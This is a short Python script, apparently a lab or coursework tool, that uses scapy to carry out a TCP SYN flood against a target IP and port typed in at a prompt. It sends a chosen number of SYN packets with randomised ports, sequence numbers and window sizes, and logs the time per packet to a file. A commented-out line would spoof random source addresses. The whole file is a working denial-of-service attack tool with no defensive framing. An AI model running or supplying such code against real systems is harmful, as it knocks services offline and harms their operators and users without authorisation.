from os import system
from sys import stdout
from scapy.all import *
from random import randint
import time
from scapy.layers.inet import TCP, IP


def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip


def my_ip():
    ip = get_if_addr(conf.iface)
    ip = get_if_addr("eth0")
    return ip


def randInt():
    x = randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    avg_time = 0
    print("Packets are sending ...")
    attack_begin = time.process_time()
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        # IP_Packet.src = randomIP()
        IP_Packet.src = my_ip()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        start = time.process_time()
        send(IP_Packet / TCP_Packet, verbose=0)
        time_per_packet = (time.process_time() - start)

        # Write it in a file
        with open('syns_results_p.txt', 'a') as f:
            f.write(f'{x}, {time_per_packet}\n')
        avg_time = avg_time+ time_per_packet
        total += 1
    attack_time = time.process_time() - attack_begin
    avg_time = avg_time/total
    with open('syns_results_p.txt', 'a') as f:
        f.write(f'\nTotal time - {attack_time}')
        f.write(f'\nAverage time -{avg_time}')
    stdout.write("\nTotal packets sent: %i\n" % total)


def info():
    system("clear")
    print("#####################################")
    print("#    Syn flood starts Python 3      #")
    print("#####################################")

    dstIP = input("\nTarget IP : ")
    dstPort = input("Target Port : ")
    print(f"Destination IP  :{dstIP}")
    print(f"Destination Port:{dstPort}")

    return dstIP, int(dstPort)


def main():
    dstIP, dstPort = info()
    counter = input("How many packets do you want to send : ")
    SYN_Flood(dstIP, dstPort, int(counter))


main()
